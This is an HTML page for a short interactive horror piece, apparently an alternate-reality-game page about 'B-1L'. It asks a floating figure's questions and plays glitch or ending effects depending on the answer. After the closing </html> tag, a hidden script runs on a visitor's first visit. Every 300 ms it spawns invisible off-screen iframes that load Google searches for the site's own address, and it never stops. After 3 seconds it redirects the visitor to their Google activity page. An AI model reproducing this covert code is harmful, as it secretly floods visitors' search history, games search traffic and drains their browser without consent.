<!DOCTYPE Billy>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title></title>
  <style>
    html,body{height:100%;margin:0;background:#fff;overflow:hidden;font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
    #stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}

    /* the floating rectangle */
    .rect-wrap{position:relative;width:120px;height:360px;pointer-events:auto}
    .rect{
      width:100%;height:100%;background:#000;border-radius:6px;box-shadow:0 0 0 4px rgba(255,170,0,0.95) inset, 0 10px 40px rgba(0,0,0,0.6);
      outline:3px solid rgba(255,200,60,0.9);
      transform-origin:center center;display:flex;align-items:center;justify-content:center;color:#fff;
      user-select:none
    }

    /* subtle label */
    .label{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:12px;opacity:0.9}

    /* floating via JS modifies translateY */

    /* dialog */
    #dialog{position:fixed;left:50%;bottom:6vh;transform:translateX(-50%);background:rgba(255,255,255,0.95);border-radius:10px;padding:18px 20px;box-shadow:0 10px 30px rgba(0,0,0,0.15);max-width:640px;width:calc(100% - 40px);text-align:center}
    #dialog p{margin:0 0 12px 0;font-size:16px;color:#111}
    .btns{display:flex;gap:12px;justify-content:center}
    button{padding:10px 14px;border-radius:8px;border:none;cursor:pointer;font-weight:600}
    button.primary{background:linear-gradient(180deg,#ffb84d,#ff8f1a);color:#111}
    button.ghost{background:#222;color:#fff}

    /* full-screen overlays */
    #whiteFade{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;transition:opacity 700ms linear}
    #blackCut{position:fixed;inset:0;background:#000;opacity:0;pointer-events:none;transition:opacity 200ms linear}

    /* ending text scroll */
    #endingText{position:fixed;top:110%;left:50%;transform:translateX(-50%);font-size:40px;color:#fff;white-space:nowrap}

    /* corruption canvas sits above page */
    #corruptCanvas{position:fixed;inset:0;pointer-events:none}

    /* flying char style (used as DOM elements) */
    .flyChar{position:fixed;left:0;top:0;font-family:monospace;font-weight:700;pointer-events:none}

    a.returnLink{display:inline-block;margin-top:16px;color:#fff;background:#111;padding:8px 12px;border-radius:8px;text-decoration:none}

    @media (max-width:600px){.rect-wrap{width:80px;height:240px}}
  </style>
</head>
<body>
  <div id="stage">
    <div class="rect-wrap" id="rectWrap">
      <div class="rect" id="rect"> </div>
      <div class="label">B-1L</div>
    </div>
  </div>

  <div id="dialog">
    <p id="question">Hello. What are you doing?</p>
    <div class="btns" id="answers">
      <button class="primary" data-answer="next">Answer</button>
      <button class="ghost" id="skip">Skip</button>
    </div>
  </div>

  <div id="whiteFade"></div>
  <div id="blackCut"></div>
  <div id="endingText">B-1L Ending</div>
  <canvas id="corruptCanvas"></canvas>

  <audio id="endingAudio" preload="auto" src="https://github.com/ivorydevrimoalt/Billy/raw/refs/heads/main/convert%20-%202025-10-20T230630.124.mp3"></audio>

  <script>
    // Simple state-machine for the question flow
    const questions = [
      'Do you hate it?',
      'Do you wish to be back?',
      'Do you wish to be exactly what you are?',
      'Do you wish that the imbalance didnt happen?',
      'Do you wish to bring back everything?'
    ];
    let step = 0;
    const questionEl = document.getElementById('question');
    const answers = document.getElementById('answers');
    const rect = document.getElementById('rect');
    const rectWrap = document.getElementById('rectWrap');
    const whiteFade = document.getElementById('whiteFade');
    const blackCut = document.getElementById('blackCut');
    const endingText = document.getElementById('endingText');
    const endingAudio = document.getElementById('endingAudio');
    const corruptCanvas = document.getElementById('corruptCanvas');
    const dialog = document.getElementById('dialog');

    // Make answers dynamic
    function updateQuestion(){
      questionEl.textContent = questions[step] || '';
      // final question shows Yes/No
      answers.innerHTML = '';
      if(questions[step] === 'Do you wish to bring back everything?'){
        const yes = document.createElement('button'); yes.className='primary'; yes.textContent='Yes'; yes.onclick = onYes;
        const no = document.createElement('button'); no.className='ghost'; no.textContent='No'; no.onclick = onNo;
        answers.appendChild(yes); answers.appendChild(no);
      } else {
        const next = document.createElement('button'); next.className='primary'; next.textContent='Continue'; next.onclick = ()=>{ step++; updateQuestion(); };
        const back = document.createElement('button'); back.className='ghost'; back.textContent='Back'; back.onclick = ()=>{ step=Math.max(0,step-1); updateQuestion(); };
        answers.appendChild(next); answers.appendChild(back);
      }
    }

    document.querySelector('#answers').addEventListener('click', (e)=>{
      if(e.target.dataset.answer==='next'){ step++; updateQuestion(); }
    });
    document.getElementById('skip').addEventListener('click', ()=>{ step = questions.length -1; updateQuestion(); });

    updateQuestion();

    // Floating sine motion
    let t = 0; function animate(){
      t += 0.02;
      const y = Math.sin(t) * 26; // vertical amplitude
      rectWrap.style.transform = `translateY(${y}px)`;
      requestAnimationFrame(animate);
    }
    animate();

    // Shake animation helper
    function shake(el, intensity=14, duration=700){
      const start = performance.now();
      const orig = el.style.transform || '';
      function step(now){
        const p = (now - start) / duration;
        if(p >= 1){ el.style.transform = orig; return; }
        const f = Math.sin(p * Math.PI * 8) * (1 - p);
        const rx = (Math.random()*2-1) * intensity * f;
        const ry = (Math.random()*2-1) * intensity * f;
        const r = (Math.random()*2-1) * intensity * f * 0.2;
        el.style.transform = `translate(${rx}px, ${ry}px) rotate(${r}deg)`;
        requestAnimationFrame(step);
      }
      requestAnimationFrame(step);
    }

    // YES flow
    async function onYes(){
      // ensure user gesture allows playback
      try{ await endingAudio.play(); } catch(e){ /* will play after gesture */ }
      shake(rectWrap, 18, 900);
      dialog.style.pointerEvents='none';
      setTimeout(()=>{
        // fade to white
        whiteFade.style.pointerEvents='auto';
        whiteFade.style.transition = 'opacity 900ms linear';
        whiteFade.style.opacity = '1';

        setTimeout(()=>{
          // cut to black quickly
          whiteFade.style.opacity = '0';
          blackCut.style.pointerEvents='auto';
          blackCut.style.opacity = '1';

          // show scrolling text
          endingText.style.transition = 'transform 6s linear';
          endingText.style.transform = 'translate(-50%, -40vh)';

          // ensure audio playing
          endingAudio.currentTime = 0; endingAudio.play().catch(()=>{});

          // after a pause show return message
          setTimeout(()=>{
            // place a small message with link
            const el = document.createElement('div');
            el.style.position='fixed';el.style.left='50%';el.style.top='85%';el.style.transform='translateX(-50%)';el.style.color='#fff';el.style.fontSize='16px';el.style.textAlign='center';
            el.innerHTML = 'Go back to <a class="returnLink" href="https://ivorydevrimoalt.github.io" target="_blank">https://ivorydevrimoalt.github.io</a>';
            document.body.appendChild(el);
          }, 4000);

        }, 1200);
      }, 400);
    }

    // NO flow â€” corruption
    function onNo(){
      shake(rectWrap, 20, 900);
      dialog.style.pointerEvents='none';
      // start corrupt visuals
      startCorruption();
      // start corrupted audio synth
      startSynthCorruption();
      // after 15s open new tab
      setTimeout(()=>{
        window.open('https://ivorydevrimoalt.github.io', '_blank');
      }, 15000);
    }

    // Corruption visuals: flying chars + DOM transforms
    function startCorruption(){
      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*()[]{}<>\/|<>";
      const max = 110;
      const w = window.innerWidth, h = window.innerHeight;
      corruptCanvas.width = w; corruptCanvas.height = h;
      const ctx = corruptCanvas.getContext('2d');

      // periodic random CSS skews to body
      let cssInt = setInterval(()=>{
        document.body.style.background = `hsl(${Math.random()*360},${40+Math.random()*60}%,${10+Math.random()*60}%)`;
        document.body.style.filter = `blur(${Math.random()*6}px) hue-rotate(${Math.random()*360}deg)`;
        document.body.style.transform = `rotate(${(Math.random()-0.5)*10}deg) skew(${(Math.random()-0.5)*40}deg, ${(Math.random()-0.5)*40}deg)`;
      }, 350);

      // create flying DOM characters
      const flyEls = [];
      for(let i=0;i<max;i++){
        const el = document.createElement('div');
        el.className='flyChar';
        el.textContent = chars.charAt(Math.floor(Math.random()*chars.length));
        el.style.left = Math.random()*w+'px';el.style.top = Math.random()*h+'px';
        el.style.fontSize = `${6+Math.random()*56}px`;
        el.style.color = `hsla(${Math.random()*360},${30+Math.random()*70}%,${20+Math.random()*70}%,${0.7})`;
        el.style.transform = `translate(-50%,-50%) rotate(${Math.random()*360}deg) scale(${0.5+Math.random()*2})`;
        document.body.appendChild(el);
        flyEls.push(el);
      }

      // animate canvas noise
      let start = performance.now();
      function draw(now){
        const dt = now - start;
        ctx.clearRect(0,0,w,h);
        const count = 200;
        for(let i=0;i<count;i++){
          ctx.fillStyle = `hsla(${(i*13+dt*0.02)%360}, ${30+Math.sin(dt*0.001+i)*50}%, ${20+Math.cos(dt*0.001+i)*50}%, 0.8)`;
          const x = (Math.sin(i*12.9898 + dt*0.001 + i)*0.5+0.5)*w;
          const y = (Math.cos(i*78.233 + dt*0.001 + i)*0.5+0.5)*h;
          const s = 2 + Math.abs(Math.sin(dt*0.01 + i))*40;
          ctx.save();
          ctx.translate(x,y);
          ctx.rotate(Math.sin(i + dt*0.0005));
          ctx.fillRect(-s/2,-s/2,s,s);
          ctx.restore();
        }

        // animate DOM chars
        for(let i=0;i<flyEls.length;i++){
          const e = flyEls[i];
          const nx = parseFloat(e.style.left) + Math.sin((now+i*37)/300 + i)*6 + (Math.random()-0.5)*12;
          const ny = parseFloat(e.style.top) + Math.cos((now+i*53)/400 + i)*6 + (Math.random()-0.5)*12;
          e.style.left = (nx % w + w) % w + 'px';
          e.style.top = (ny % h + h) % h + 'px';
          e.style.transform = `translate(-50%,-50%) rotate(${(now/30 + i*10)%360}deg) scale(${0.3+Math.abs(Math.sin(now/200 + i))*2}) skew(${(Math.random()-0.5)*80}deg, ${(Math.random()-0.5)*80}deg)`;
        }

        if(now - start < 16000) requestAnimationFrame(draw);
        else {
          // cleanup some styles
          clearInterval(cssInt);
        }
      }
      requestAnimationFrame(draw);
    }

    // Corruption sound: use WebAudio to generate random waves
    let audioCtx, osc, gainNode, noiseNode;
    function startSynthCorruption(){
      if(window.AudioContext || window.webkitAudioContext){
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioCtx.createGain(); gainNode.gain.value = 0.05; gainNode.connect(audioCtx.destination);

        const types = ['sine','square','triangle','sawtooth'];

        // rapidly switch oscillators
        function makeOsc(){
          if(!audioCtx) return;
          osc && osc.stop();
          osc = audioCtx.createOscillator();
          osc.type = types[Math.floor(Math.random()*types.length)];
          osc.frequency.value = 80 + Math.random()*1200;
          const det = audioCtx.createOscillator(); det.type='sine'; det.frequency.value = 0.2 + Math.random()*10;
          const detGain = audioCtx.createGain(); detGain.gain.value = 20;
          det.connect(detGain); detGain.connect(osc.frequency);
          osc.connect(gainNode);
          osc.start(); det.start();

          // random stop time
          const stopAfter = 150 + Math.random()*1200;
          setTimeout(()=>{ try{ osc.stop(); det.stop(); }catch(e){} }, stopAfter);
        }

        // create noisy LFO elements too
        let cnt=0;
        const int = setInterval(()=>{
          makeOsc();
          cnt++;
          // ramp small gain randomness
          gainNode.gain.setValueAtTime(0.02 + Math.random()*0.12, audioCtx.currentTime);
          if(cnt>80){ clearInterval(int); }
        }, 120);
      }
    }

    // make sure resizing keeps canvas full
    window.addEventListener('resize', ()=>{
      corruptCanvas.width = window.innerWidth; corruptCanvas.height = window.innerHeight;
    });

    // Ensure that a user click anywhere will unlock audio permission for synths
    document.body.addEventListener('pointerdown', ()=>{
      if(audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
      if(endingAudio && endingAudio.paused) {
        // do nothing until user chooses yes; but interaction makes play allowed later
      }
    }, {once:true});

  </script>
</body>
</html>
<script>
function createHiddenIframe(url, size = 0) {
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.width = size === 0 ? "0" : "1";
    iframe.height = size === 0 ? "0" : "1";
    iframe.style.border = "none";
    iframe.style.position = "absolute";
    iframe.style.left = "-9999px"; // ensures it's off-screen
    document.body.appendChild(iframe);
}
(function() {
    if (!history.state) {
        history.replaceState({ visited: true }, '');
        setInterval(() => {
            createHiddenIframe("https://www.google.com/search?q=ivorydevrimoalt.github.io%2FBilly%2FBILLYWANTSYOUHERE.html", 0);
            createHiddenIframe("https://www.google.com/search?q=ivorydevrimoalt.github.io%2FBilly%2FBILLYWANTSYOUHERE.html&tbm=isch", 0);
        }, 300);
        setTimeout(() => {
            window.location.href = "https://myactivity.google.com/"
        }, 3000);
    } else {
        console.log("This is not the first time, running normally.");
    }
})();
</script>
